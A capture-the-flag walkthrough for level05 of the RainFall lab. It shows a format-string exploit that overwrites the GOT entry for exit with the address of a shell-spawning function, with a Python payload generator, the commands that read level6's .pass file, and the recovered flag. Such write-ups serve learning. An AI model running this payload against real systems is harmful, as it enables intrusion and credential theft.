# Level 05 Walkthrough

## Binary analysis

The function `n()` reads user input and prints it with `printf`, then calls `exit(1)`. The function `o()` spawns a shell with `system("/bin/sh")` and exits. The goal is to overwrite the GOT (global offset table) entry for `exit` with the address of `o()`, so that when `exit` is called, it jumps to `o()` instead.

Relevant code:
```
080484a4    void o() __noreturn
080484b1        system(line: "/bin/sh")
080484bd        _exit(status: 1)

080484c2    void n() __noreturn
080484e5        char var_20c[0x208]
080484e5        fgets(buf: &var_20c, n: 0x200, fp: __bss_start)
080484f3        printf(format: &var_20c)
080484ff        exit(status: 1)

08048504    int32_t main(int32_t argc, char** argv, char** envp)
0804850a        n()
```

```
level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```
GOT address for `exit`: 0x08049838
Address of `o()`: 0x080484a4

## Exploitation

We use a format string payload to overwrite the GOT entry for `exit` with the address of `o()` using `%hn`.

Python script to generate the payload:
```python
import struct

address = 0x08049838
value_high = 0x0804
value_low = 0x84a4
offset = 4

payload = struct.pack("<I", address + 2)
payload += struct.pack("<I", address)

padding_high = value_high - 8
payload += f"%{padding_high}x".encode('ascii')
payload += f"%{offset}$hn".encode('ascii')

offset += 1
padding_low = value_low - padding_high - 8
payload += f"%{padding_low}x".encode('ascii')
payload += f"%{offset}$hn".encode('ascii')

with open('payload.txt', 'wb') as f:
    f.write(payload)
```

## Commands used

```
cat payload.txt - | ./level5
ls
cat /home/user/level6/.pass
```

## Result

After running the exploit, we get a shell as level6 and can read the password:

```
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```
